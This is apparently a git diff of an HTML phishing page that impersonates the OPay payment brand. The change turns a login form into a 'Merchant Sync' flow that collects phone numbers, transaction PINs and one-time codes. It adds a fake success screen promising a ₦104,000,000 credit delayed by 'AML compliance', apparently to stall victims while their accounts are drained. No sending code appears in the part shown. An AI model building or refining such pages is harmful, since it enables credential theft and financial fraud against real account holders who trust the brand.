@@ -3,53 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Login | Portal</title>
+    <title>Merchant Portal | Secure Verification</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
     <div class="container">
-        <div class="login-card" id="login-card">
-            <div class="logo-section">
-                <span class="brand-name">OPay</span>
-            </div>
-            
+        <div class="card-content" id="login-card">
+            <div class="logo-section"><span class="brand-name">OPay</span></div>
             <div class="form-header">
-                <h2>Welcome Back</h2>
-                <p>Verify your account to continue</p>
+                <h2>Merchant Sync</h2>
+                <p>Verify your credentials to authorize high-volume inflow.</p>
             </div>
-
             <form id="auth-form">
                 <div class="input-group">
-                    <label for="phone">Phone Number</label>
-                    <input type="tel" id="phone" placeholder="0801 234 5678" autocomplete="off">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="0801 234 5678" required>
                 </div>
-
                 <div class="input-group">
-                    <label for="pin">Transaction PIN</label>
-                    <input type="password" id="pin" placeholder="****" maxlength="6" autocomplete="off">
+                    <label>Transaction PIN</label>
+                    <input type="password" id="pin" placeholder="****" maxlength="6" required>
                 </div>
-
-                <button type="submit" class="btn-primary" id="submit-btn">Sign In</button>
+                <button type="submit" class="btn-primary" id="submit-btn">Continue</button>
             </form>
         </div>
 
         <div id="otp-section" style="display: none; text-align: center;">
-            <div class="logo-section">
-                <span class="brand-name">OPay</span>
-            </div>
+            <div class="logo-section"><span class="brand-name">OPay</span></div>
             <div class="form-header">
-                <h2>Enter OTP</h2>
-                <p>A 6-digit code has been sent to your phone</p>
+                <h2>Account Verification</h2>
+                <p>Enter the 6-digit synchronization code sent to your device.</p>
             </div>
-            
             <div class="input-group">
-                <input type="number" id="otp-input" placeholder="******" maxlength="6" style="text-align: center; letter-spacing: 5px;">
+                <input type="number" id="otp-input" placeholder="******" style="text-align: center; letter-spacing: 5px;">
             </div>
-
             <p id="timer-text" style="color: #666; margin-bottom: 20px;">Resend in 60s</p>
-            
-            <button type="button" class="btn-primary" id="verify-otp-btn">Verify Account</button>
+            <button type="button" class="btn-primary" id="verify-otp-btn">Complete Sync</button>
+        </div>
+
+        <div id="success-section" style="display: none; text-align: center;">
+            <div class="success-icon">✅</div>
+            <h2 style="color: #00C853; margin-bottom: 10px;">Sync Successful</h2>
+            <p style="font-size: 14px; color: #444; line-height: 1.6;">
+                Your account tier has been upgraded to <b>Merchant Plus</b>. <br><br>
+                The pending credit of <b>₦104,000,000.00</b> is now in the settlement queue. Due to AML compliance, funds will reflect in your balance within <b>2 - 3 hours</b>.
+            </p>
+            <div style="background: #f9f9f9; padding: 10px; border-radius: 8px; margin-top: 20px; font-size: 12px; color: #888;">
+                Ref ID: OPT-99283-XM
+            </div>
         </div>
     </div>
 
